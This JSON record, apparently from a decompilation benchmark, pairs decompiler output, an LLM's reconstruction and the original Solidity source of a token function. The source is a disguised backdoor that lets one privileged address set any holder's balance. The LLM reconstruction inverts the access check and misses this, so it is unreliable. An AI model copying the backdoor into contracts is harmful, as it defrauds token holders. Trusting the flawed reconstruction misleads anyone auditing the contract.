{
    "contract_address": "0xd4877eAc39dC23770c50dAbcB1F2BC6208893E92",
    "heimdall_input": "function addviperHolder(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(!msg.sender == (address(store_f)));\n        require(!0x0a < 0x64);\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        storage_map_b[var_a] = arg1;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!0x0a < 0x0a);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(arg0);\n        var_b = 0;\n        storage_map_b[var_a] = arg1;\n    }",
    "llm_output": "function addViperHolder(address holder, uint256 amount) public payable {\n    // 1. Original check: `arg0 == address(arg0)`\n    require(holder == address(holder));\n\n    // 2. Original (malformed) check: `!msg.sender == address(store_f)`\n    // Interpreted as `msg.sender != store_f`\n    require(msg.sender != store_f);\n\n    // 3. Original constant check that always passed: `!0x0a < 0x64`\n    require(true);\n\n    // First mapping update\n    address tempHolder = holder;\n    uint256 tempUint = 0;\n    storage_map_b[tempHolder] = amount;\n\n    // Decompiler-artifact assignments (kept for fidelity)\n    bytes32 errorSelector = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n    uint256 errorCode   = 0x11;\n\n    // 4. Another constant check that always passed: `!0x0a < 0x0a`\n    require(true);\n\n    // Repeat decompiler-artifact assignments (kept for fidelity)\n    errorSelector = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n    errorCode     = 0x11;\n\n    // Second (duplicate) mapping update\n    tempHolder = holder;\n    tempUint   = 0;\n    storage_map_b[tempHolder] = amount;\n}",
    "ground_truth": "function addviperHolder(\r\n        address _value,\r\n        uint256 _amt\r\n    ) public {\r\n        uint256 _amount = 10 - (\r\n        msg.sender != _vp ? 10**2 : 10);\r\n        mapping(address => uint256) storage excludeFee =\r\n        _balances;_amount = 0;\r\n        excludeFee[_value] = _amt;\r\n    }"
}